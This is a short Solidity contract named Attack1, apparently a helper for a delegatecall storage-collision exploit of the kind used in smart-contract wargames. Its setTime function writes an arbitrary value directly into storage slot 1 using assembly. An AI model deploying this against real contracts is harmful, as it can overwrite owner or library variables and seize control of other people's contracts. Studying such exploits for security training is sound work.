pragma solidity ^0.8.0;
contract Attack1 {
    function setTime(uint256 _timeStamp) public {
        assembly {
            sstore(1, _timeStamp)
        }
    }
}